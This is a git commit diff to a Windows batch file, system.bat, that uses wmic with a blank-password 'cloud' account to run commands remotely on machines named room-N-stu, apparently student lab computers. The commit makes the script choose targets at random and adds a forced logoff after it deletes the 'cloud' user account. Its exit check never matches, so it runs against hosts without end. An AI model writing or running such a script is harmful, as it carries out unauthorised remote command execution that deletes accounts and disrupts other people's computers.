9ee9337aa3fc982bb10b22fdf29dd9b32c054e13
sodih3iw <116991585+sodih3iw@users.noreply.github.com>
2026-01-15 22:52:43 +0800

    更新 system.bat

--- system.bat
+++ system.bat
@@ -1,12 +1,15 @@
 @echo off
 setlocal enabledelayedexpansion
 
-set i=11
+::set i=11
+set /a i=%random% %% 100
+
 :001
 set TARGET=room-%i%-stu
-wmic /node:"%TARGET%" /user:"cloud" /password:"" process call create "cmd /c net user "cloud" /delete"
+wmic /node:"%TARGET%" /user:"cloud" /password:"" process call create "cmd /c net user "cloud" /delete&&cmd /c shutdown /l"
 ::wmic /node:"%TARGET%" /user:"cloud" /password:"" process call create "cmd /c shutdown /l"
-set /a i+=1
+::set /a i+=1
+set /a i=%random% %% 100
 if "i" == "72" (
 exit /b 0
 )
